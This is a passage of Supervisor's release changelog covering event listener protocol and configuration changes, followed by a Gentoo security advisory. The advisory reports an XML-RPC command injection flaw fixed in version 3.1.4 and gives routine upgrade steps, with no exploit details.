 PROCESS\_STATE\_EXITED replaces PROCESS\_STATE\_CHANGE\_EXITED\_FROM\_RUNNING
 PROCESS\_STATE\_STOPPED replaces PROCESS\_STATE\_CHANGE\_STOPPED\_FROM\_STOPPING
 PROCESS\_STATE\_FATAL replaces PROCESS\_STATE\_CHANGE\_FATAL\_FROM\_BACKOFF
 PROCESS\_STATE\_UNKNOWN replaces PROCESS\_STATE\_CHANGE\_TO\_UNKNOWN
 PROCESS\_STATE replaces PROCESS\_STATE\_CHANGE
 The PROCESS\_STATE\_CHANGE\_EXITED\_OR\_STOPPED abstract event is gone.
 All process state changes have at least "processname", "groupname", and "from\_state" (the name of the previous state) in their serializations.
 PROCESS\_STATE\_EXITED additionaly has "expected" (1 or 0) and "pid" (the process id) in its serialization.
 PROCESS\_STATE\_RUNNING, PROCESS\_STATE\_STOPPING, PROCESS\_STATE\_STOPPED additionally have "pid" in their serializations.
 PROCESS\_STATE\_STARTING and PROCESS\_STATE\_BACKOFF have "tries" in their serialization (initially "0", bumped +1 each time a start retry happens).
- Remove documentation from README.txt, point people to http://supervisord.org/manual/ .
- The eventlistener request/response protocol has changed. OK/FAIL must now be wrapped in a RESULT envelope so we can use it for more specialized communications.
 Previously, to signify success, an event listener would write the string ``OK\n`` to its stdout. To signify that the event was seen but couldn't be handled by the listener and should be rebuffered, an event listener would write the string ``FAIL\n`` to its stdout.
 In the new protocol, the listener must write the string::
 RESULT {resultlen}\n{result}
 For example, to signify OK::
 RESULT 2\nOK
 To signify FAIL::
 RESULT 4\nFAIL
 See the scripts/sample\_eventlistener.py script for an example.
- To provide a hook point for custom results returned from event handlers (see above) the [eventlistener:x] configuration sections now accept a "result\_handler=" parameter, e.g. "result\_handler=supervisor.dispatchers:default\_handler" (the default) or "handler=mypackage:myhandler". The keys are pkgutil "entry point" specifications (importable Python function names). Result handlers must be callables which accept two arguments: one named "event" which represents the event, and the other named "result", which represents the listener's result. A result handler either executes successfully or raises an exception. If it raises a supervisor.dispatchers.RejectEvent exception, the event will be rebuffered, and the eventhandler will be placed back into the ACKNOWLEDGED state. If it raises any other exception, the event handler will be placed in the UNKNOWN state. If it does not raise any exception, the event is considered successfully processed. A result handler's return value is ignored. Writing a result handler is a "in case of emergency break glass" sort of thing, it is not something to be used for arbitrary business code. In particular, handlers \*must not block\* for any appreciable amount of time.
 The standard eventlistener result handler (supervisor.dispatchers:default\_handler) does nothing if it receives an "OK" and will raise a supervisor.dispatchers.RejectEvent exception if it receives any other value.
- Supervisord now emits TICK events, which happen every N seconds. Three types of TICK events are available: TICK\_5 (every five seconds), TICK\_60 (every minute), TICK\_3600 (every hour). Event listeners may subscribe to one of these types of events to perform every-so-often processing. TICK events are subtypes of the EVENT type.
- Get rid of OSX platform-specific memory monitor and replace with memmon.py, which works on both Linux and Mac OS. This script is now a console script named "memmon".
- Allow "web handler" (the handler which receives http requests from browsers visiting the web UI of supervisor) to deal with POST requests.
- RPC interface methods stopProcess(), stopProcessGroup(), and stopAllProcesses() now take an optional "wait" argument that defaults to True for parity with the start methods.
3.0a3 (2007-10-02)------------------
- Supervisorctl now reports a better error message when the main supervisor XML-RPC namespace is not registered. Thanks to Mike Orr for reporting this. (Mike Naberezny)
- Create ``scripts`` directory within supervisor package, move ``pidproxy.py`` there, and place sample event listener and comm event programs within the directory.
- When an event notification is buffered (either because a listener rejected it or because all listeners were busy when we attempted to send it originally), we now rebuffer it in a way that will result in it being retried earlier than it used to be.
- When a listener process exits (unexpectedly) before transitioning from the BUSY state, rebuffer the event that was being processed.
- supervisorctl ``tail`` command now accepts a trailing specifier: ``stderr`` or ``stdout``, which respectively, allow a user to tail the stderr or stdout of the named process. When this specifier is not provided, tail defaults to stdout.
- supervisor ``clear`` command now clears both stderr and stdout logs for the given process.
- When a process encounters a spawn error as a result of a failed execve or when it cannot setuid to a given uid, it now puts this info into the process' stderr log rather than its stdout log.
- The event listener protocol header now contains the ``server`` identifier, the ``pool`` that the event emanated from, and the ``poolserial`` as well as the values it previously contained (version, event name, serial, and length). The server identifier is taken from the config file options value ``identifier``, the ``pool`` value is the name of the listener pool that this event emanates from, and the ``poolserial`` is a serial number assigned to the event local to the pool that is processing it.
- The event listener protocol header is now a sequence of key-value pairs rather than a list of positional values. Previously, a representative header looked like::
 SUPERVISOR3.0 PROCESS\_COMMUNICATION\_STDOUT 30 22\n
 Now it looks like::
 ver:3.0 server:supervisor serial:21 ...
- Specific event payload serializations have changed. All event types that deal with processes now include the pid of the process that the event is describing. In event serialization "header" values, we've removed the space between the header name and the value and headers are now separated by a space instead of a line feed. The names of keys in all event types have had underscores removed.
- Abandon the use of the Python stdlib ``logging`` module for speed and cleanliness purposes. We've rolled our own.
- Fix crash on start if AUTO logging is used with a max\_bytes of zero for a process.
- Improve process communication event performance.
- The process config parameters ``stdout\_capturefile`` and ``stderr\_capturefile`` are no longer valid. They have been replaced with the ``stdout\_capture\_maxbytes`` and ``stderr\_capture\_maxbytes`` parameters, which are meant to be suffix-multiplied integers. They both default to zero. When they are zero, process communication event capturing is not performed. When either is nonzero, the value represents the maximum number of bytes that will be captured between process event start and end tags. This change was to support the fact that we no longer keep capture data in a separate file, we just use a FIFO in RAM to maintain capture info. For users whom don't care about process communication events, or whom haven't changed the defaults for ``stdout\_capturefile`` or ``stderr\_capturefile``, they needn't do anything to their configurations to deal with this change.
- Log message levels have been normalized. In particular, process stdin/stdout is now logged at ``debug`` level rather than at ``trace`` level (``trace`` level is now reserved for output useful typically for debugging supervisor itself). See "Supervisor Log Levels" in the documentation for more info.
- When an event is rebuffered (because all listeners are busy or a listener rejected the event), the rebuffered event is now inserted in the head of the listener event queue. This doesn't guarantee event emission in natural ordering, because if a listener rejects an event or dies while it's processing an event, it can take an arbitrary amount of time for the event to be rebuffered, and other events may be processed in the meantime. But if pool listeners never reject an event or don't die while processing an event, this guarantees that events will be emitted in the order that they were received because if all listeners are busy, the rebuffered event will be tried again "first" on the next go-around.
- Removed EVENT\_BUFFER\_OVERFLOW event type.
- The supervisorctl xmlrpc proxy can now communicate with supervisord using a persistent HTTP connection.
- A new module "supervisor.childutils" was added. This module provides utilities for Python scripts which act as children of supervisord. Most notably, it contains an API method "getRPCInterface" allows you to obtain an xmlrpxlib ServerProxy that is willing to communicate with the parent supervisor. It also contains utility functions that allow for parsing of supervisor event listener protocol headers. A pair of scripts (loop\_eventgen.py and loop\_listener.py) were added to the script directory that serve as examples about how to use the childutils module.
- A new envvar is added to child process environments: SUPERVISOR\_SERVER\_URL. This contains the server URL for the supervisord running the child.
- An ``OK`` URL was added at ``/ok.html`` which just returns the string ``OK`` (can be used for up checks or speed checks via plain-old-HTTP).
- An additional command-line option ``--profile\_options`` is accepted by the supervisord script for developer use::
 supervisord -n -c sample.conf --profile\_options=cumulative,calls
 The values are sort\_stats options that can be passed to the standard Python profiler's PStats sort\_stats method.
 When you exit supervisor, it will print Python profiling output to stdout.
- If cElementTree is installed in the Python used to invoke supervisor, an alternate (faster, by about 2X) XML parser will be used to parse XML-RPC request bodies. cElementTree was added as an "extras\_require" option in setup.py.
- Added the ability to start, stop, and restart process groups to supervisorctl. To start a group, use ``start groupname:\*``. To start multiple groups, use ``start groupname1:\* groupname2:\*``. Equivalent commands work for "stop" and "restart". You can mix and match short processnames, fullly-specified group:process names, and groupsplats on the same line for any of these commands.
- Added ``directory`` option to process config. If you set this option, supervisor will chdir to this directory before executing the child program (and thus it will be the child's cwd).
- Added ``umask`` option to process config. If you set this option, supervisor will set the umask of the child program. (Thanks to Ian Bicking for the suggestion).
- A pair of scripts ``osx\_memmon\_eventgen.py`` and `osx\_memmon\_listener.py`` have been added to the scripts directory. If they are used together as described in their comments, processes which are consuming "too much" memory will be restarted. The ``eventgen`` script only works on OSX (my main development platform) but it should be trivially generalizable to other operating systems.
- The long form ``--configuration`` (-c) command line option for supervisord was broken. Reported by Mike Orr. (Mike Naberezny)
- New log level: BLAT (blather). We log all supervisor-internal-related debugging info here. Thanks to Mike Orr for the suggestion.
- We now allow supervisor to listen on both a UNIX domain socket and an inet socket instead of making them mutually exclusive. As a result, the options "http\_port", "http\_username", "http\_password", "sockchmod" and "sockchown" are no longer part of the ``[supervisord]`` section configuration. These have been supplanted by two other sections: ``[unix\_http\_server]`` and ``[inet\_http\_server]``. You'll need to insert one or the other (depending on whether you want to listen on a UNIX domain socket or a TCP socket respectively) or both into your supervisord.conf file. These sections have their own options (where applicable) for port, username, password, chmod, and chown. See README.txt for more information about these sections.
- All supervisord command-line options related to "http\_port", "http\_username", "http\_password", "sockchmod" and "sockchown" have been removed (see above point for rationale).
- The option that \*used\* to be ``sockchown`` within the ``[supervisord]`` section (and is now named ``chown`` within the ``[unix\_http\_server]`` section) used to accept a dot-separated user.group value. The separator now must be a colon ":", e.g. "user:group". Unices allow for dots in usernames, so this change is a bugfix. Thanks to Ian Bicking for the bug report.
- If a '-c' option is not specified on the command line, both supervisord and supervisorctl will search for one in the paths ``./supervisord.conf`` , ``./etc/supervisord.conf`` (relative to the current working dir when supervisord or supervisorctl is invoked) or in ``/etc/supervisord.conf``[View remainder of file in raw view](https://github.com/Supervisor/supervisor/raw/refs/tags/3.1.4/CHANGES.txt)

# Supervisor: command injection vulnerability — GLSA **201709-06**

A vulnerability in Supervisor might allow remote attackers to
execute arbitrary code.

### Affected packages

| Package | **app-admin/supervisor** on all architectures |
| --- | --- |
| Affected versions | < **3.1.4** |
| Unaffected versions | >= **3.1.4** |

### Background

Supervisor is a client/server system that allows its users to monitor
and control a number of processes on UNIX-like operating systems.

### Description

A vulnerability in Supervisor was discovered in which an authenticated
client could send malicious XML-RPC requests and supervidord will run
them as shell commands with process privileges. In some cases,
supervisord is configured with root permissions.

### Impact

A remote attacker could execute arbitrary code with the privileges of
the process.

### Workaround

There is no known workaround at this time.

### Resolution

All Supervisor users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose "=app-admin/supervisor-3.1.4"

```
